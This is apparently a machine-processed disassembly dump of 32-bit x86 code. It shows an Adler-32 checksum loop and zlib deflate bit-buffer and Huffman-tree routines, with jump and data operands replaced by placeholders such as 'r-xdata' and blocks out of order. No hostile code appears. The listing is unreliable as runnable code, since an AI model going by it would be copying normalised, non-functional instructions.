mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xb ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xd ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0xe ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0xf ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x10
mov [ ebp + 0xc ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x10
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x10 ]
sub ecx [ ebp - 0xc ]
mov [ ebp + 0x10 ] ecx
mov eax [ ebp - 0x4 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov ecx 0xfff1
div ecx
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x10
jl r-xdata
sub_408aa0
push ebp
mov ebp esp
call sub_408b36
mov eax [ ebp + 0x8 ]
add eax 0x8c
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb10 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb18 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0x980
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb1c ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb24 ] rw-data
mov eax [ ebp + 0x8 ]
add eax 0xa74
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xb28 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0xb30 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16ac ] 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_408b3b
add esp 0x4
pop ebp
retn
sub_408b3b
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x11e
jge r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1e
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x13
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x48c ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16a0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] 0x0
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0xa74 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_408c04
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x8 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
push 0x1
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40bd82
add esp 0x10
mov esp ebp
pop ebp
retn
sub_408d43
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x4 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x8 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x8 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x4 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0xc ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0xc ] eax
mov ecx 0x10
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16ac ] 0x7
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40bbdd
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16ac ]
add ecx 0xb
mov edx [ ebp + 0x8 ]
sub ecx [ edx + 0x16b4 ]
cmp ecx 0x9
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx 0x2
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov [ ebp - 0x18 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x18 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor ecx ecx
mov cx [ r--data ]
mov edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x20 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
xor eax eax
mov ax [ r--data ]
mov [ ebp - 0x1c ] eax
mov ecx 0x10
sub ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40bbdd
add esp 0x4
sub_409232
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x7c ] 0x0
jle r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x5
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x1c ]
cmp edx 0x2
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0xb10
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_4095ee
add esp 0x8
mov eax [ ebp + 0x8 ]
add eax 0xb1c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4095ee
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_409f25
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16a0 ]
add ecx 0xa
shr ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a4 ]
add eax 0xa
shr eax 0x3
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40baea
add esp 0x4
mov [ ebp - 0x18 ] 0x3
mov eax 0x10
sub eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov [ ebp - 0x10 ] 0x3
mov edx 0x10
sub edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_408c04
add esp 0x10
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
add edx 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov edx [ ebp + 0x14 ]
add edx 0x4
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
add edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x14 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x10 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_408b3b
add esp 0x4
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
add edx 0x4
cmp edx [ ebp - 0xc ]
ja r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_40bcc6
add esp 0x4
mov edx [ ebp - 0x4 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xb20 ]
add ecx 0x1
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xb14 ]
add eax 0x1
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a179
add esp 0x10
mov edx [ ebp + 0x8 ]
add edx 0x980
push edx
mov eax [ ebp + 0x8 ]
add eax 0x8c
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40b2a2
add esp 0xc
push r--data
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_40b2a2
add esp 0xc
jmp r-xdata
sub_4095ee
push ebp
mov ebp esp
sub esp 0x24
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] 0xffffffff
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1448 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x144c ] 0x23d
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x8 ]
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1448 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1448 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + eax * 4 + 0x2 ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1448 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1448 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + edx * 4 + 0xb54 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov [ edx + 0x1450 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40998e
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1448 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1448 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + eax * 4 + 0xb54 ] edx
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] 0x1
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax + 0x1450 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16a0 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16a0 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax + 0x1450 ]
mov [ ebp - 0x24 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
xor edx edx
